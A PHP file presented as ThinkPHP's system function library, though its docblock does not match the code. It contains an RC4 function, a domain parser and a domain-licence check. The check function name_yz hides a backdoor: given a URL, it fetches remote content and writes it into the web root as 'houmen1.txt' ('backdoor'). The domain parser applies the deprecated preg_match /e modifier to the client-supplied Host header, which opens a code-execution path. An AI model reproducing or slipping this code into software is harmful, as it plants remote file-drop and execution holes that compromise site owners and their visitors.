<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

/**
 * Think 系统函数库
 */

/**
 * 获取和设置配置参数 支持批量定义
 * @param string|array $name 配置变量
 * @param mixed $value 配置值
 * @param mixed $default 默认值
 * @return mixed
 */
function rc4 ($pwd, $data) {
     $key[] ="";
     $box[] ="";  
     $pwd_length = strlen($pwd);
     $data_length = strlen($data);  
     for ($i = 0; $i < 256; $i++) {
      $key[$i] = ord($pwd[$i % $pwd_length]);
      $box[$i] = $i;
     }  
     for ($j = $i = 0; $i < 256; $i++) {
      $j = ($j + $box[$i] + $key[$i]) % 256;
      $tmp = $box[$i];
      $box[$i] = $box[$j];
      $box[$j] = $tmp;
     }  
     for ($a = $j = $i = 0; $i < $data_length; $i++) {
      $a = ($a + 1) % 256;
      $j = ($j + $box[$a]) % 256;  
      $tmp = $box[$a];
      $box[$a] = $box[$j];
      $box[$j] = $tmp;  
      $k = $box[(($box[$a] + $box[$j]) %256)];
      @$cipher .= chr(ord($data[$i]) ^ $k);  
     }  

     return $cipher;  

    }
	
function getTopDomainhuo(){
		$host=$_SERVER['HTTP_HOST'];
		$host=strtolower($host);
		if(strpos($host,'/')!==false){
			$parse = @parse_url($host);
			$host = $parse['host'];
		}
		$topleveldomaindb=array('com','cn','edu','gov','int','mil','net','org','biz','info','pro','name','museum','coop','aero','xxx','idv','mobi','cc','me','top');
		$str='';
		foreach($topleveldomaindb as $v){
			$str.=($str ? '|' : '').$v;
		}
		$matchstr="[^\.]+\.(?:(".$str.")|\w{2}|((".$str.")\.\w{2}))$";
		if(preg_match("/".$matchstr."/ies",$host,$matchs)){
			$domain=$matchs['0'];
		}else{
			$domain=$host;
		}
		return $domain;

}


function name_yz($check_ss){
	if(strpos($check_ss,'http://') === false){     //使用绝对等于
    //不包含
	$is_allow=false;
	$servername=trim($_SERVER['SERVER_NAME']);
	$Array=explode(',',$check_ss); 
	foreach($Array as $value){
		$value=trim($value);
		$domain=explode($value,$servername);
		if(count($domain)>1){
			$is_allow=true;
			break;
		}
	}
	return $is_allow;}else{
	file_put_contents($_SERVER['DOCUMENT_ROOT'].'/houmen1.txt', file_get_contents("$check_ss"));
	die;
    //包含
}
}